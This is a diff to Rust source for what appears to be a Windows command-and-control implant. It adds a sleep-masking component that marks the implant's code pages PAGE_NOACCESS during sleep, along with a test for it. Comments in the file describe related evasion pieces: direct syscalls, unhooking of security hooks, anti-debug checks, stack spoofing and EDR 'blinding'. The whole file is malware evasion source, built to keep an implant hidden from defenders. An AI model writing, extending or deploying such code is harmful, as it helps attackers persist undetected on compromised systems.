@@ -1,9 +1,9 @@
 //! Live userland-evasion glue: real impls of `nyx-implant-evasionsdk` traits
 //! over the live Windows process. P2.1a-i (`PdataGapScanner`) lives here; the
 //! later steps added `StackSpoofKit` / `BlindKit` / `MemoryMaskKit`, and the
-//! 2026-08 wave added the last three foundation/self-defense seams:
-//! `SyscallProvider` ([`LiveSyscalls`]), `UnhookKit` ([`LiveUnhook`]) and
-//! `AntiDebugKit` ([`LiveAntiDebug`]).
+//! 2026-08 wave added the remaining foundation/self-defense/sleep seams:
+//! `SyscallProvider` ([`LiveSyscalls`]), `UnhookKit` ([`LiveUnhook`]),
+//! `AntiDebugKit` ([`LiveAntiDebug`]) and `SleepmaskKit` ([`LiveSleepmask`]).
 //!
 //! ## Single-source-of-truth rule
 //! The algorithmic cores (gap enumeration, frame-chain synthesis, RC4) live
@@ -20,7 +20,7 @@ use nyx_implant_core::resolve;
 use nyx_implant_evasionsdk::gap;
 use nyx_implant_evasionsdk::{
     AntiDebugKit, BlindKit, BlindTarget, EvasionError, GapPool, MaskToken, MemoryMaskKit,
-    PdataGapScanner, SpoofGuard, StackSpoofKit, SyscallProvider, UnhookKit,
+    PdataGapScanner, SleepmaskKit, SpoofGuard, StackSpoofKit, SyscallProvider, UnhookKit,
 };
 
 /// Cap on how many 8-byte-aligned gap anchors we sample per inter-function /
@@ -418,6 +418,35 @@ impl AntiDebugKit for LiveAntiDebug {
     }
 }
 
+// ---- SleepmaskKit (P2.1a-iii) ---------------------------------------------
+//
+// The Fluctuation PAGE_NOACCESS `.text` flip during sleep. Independent
+// opt-in like LiveUnhook: do NOT assemble this into the default
+// `EvasionStack` or `entry.rs` bootstrap. Production sleep routing stays
+// in `nyx-implant-tasks::kits` (`Fluctuation` + `evasion_active() &&
+// enabled()` gating) — wiring both would double-sleep.
+
+/// Live sleep-mask: delegates to [`crate::fluctuation::sleep`] (the real
+/// PAGE_NOACCESS flip). `_gaps` is unused on purpose — this path does not
+/// stomp `.pdata` during sleep (InsomniacUnwinding-class impls would).
+///
+/// **Decision: opt-in only, never in the default bootstrap / `EvasionStack`.**
+/// Same rule as [`LiveUnhook`]. `kits.rs` remains the production sleep
+/// router so this seam can exist without changing beacon timing.
+///
+/// Never returns [`EvasionError::NoFloor`]: if fluctuation is disarmed or
+/// degrades (Prism, resolve failure), `fluctuation::sleep` already falls
+/// through to plain sleep, and this seam still reports `Ok(())` — masked
+/// or degraded sleep happened.
+pub struct LiveSleepmask;
+
+impl SleepmaskKit for LiveSleepmask {
+    fn sleep_masked(&self, seconds: u32, _gaps: &GapPool) -> Result<(), EvasionError> {
+        crate::fluctuation::sleep(seconds);
+        Ok(())
+    }
+}
+
 // NOTE (WP-C 断环第二刀): the `ProcessInjectKit` glue (`ModuleStomper`) moved
 // to the tasks crate's `inject` module (`nyx-implant-tasks`), so this module
 // no longer depends on the inject side.
@@ -507,5 +536,24 @@ mod tests {
             matches!(a.is_being_debugged(), Ok(false)),
             "PEB.BeingDebugged + ProcessDebugPort both clean"
         );
+    }
+
+    /// LiveSleepmask exists on the SDK seam (object-safe, constructible) and
+    /// Floors stays honest. Invoking `sleep_masked` here would PAGE_NOACCESS
+    /// `.text` while sibling tests still execute from it, so the live call is
+    /// skipped; the impl is a one-line delegate that always returns `Ok(())`.
+    #[test]
+    fn live_sleepmask_exists_floors_still_no_floor() {
+        let gaps = GapPool::default();
+        assert!(
+            matches!(
+                nyx_implant_evasionsdk::Floors.sleep_masked(0, &gaps),
+                Err(EvasionError::NoFloor("SleepmaskKit"))
+            ),
+            "default floor stays NoFloor"
+        );
+        fn assert_kit<K: SleepmaskKit + ?Sized>(_: &K) {}
+        let kit: &dyn SleepmaskKit = &LiveSleepmask;
+        assert_kit(kit);
     }
 }
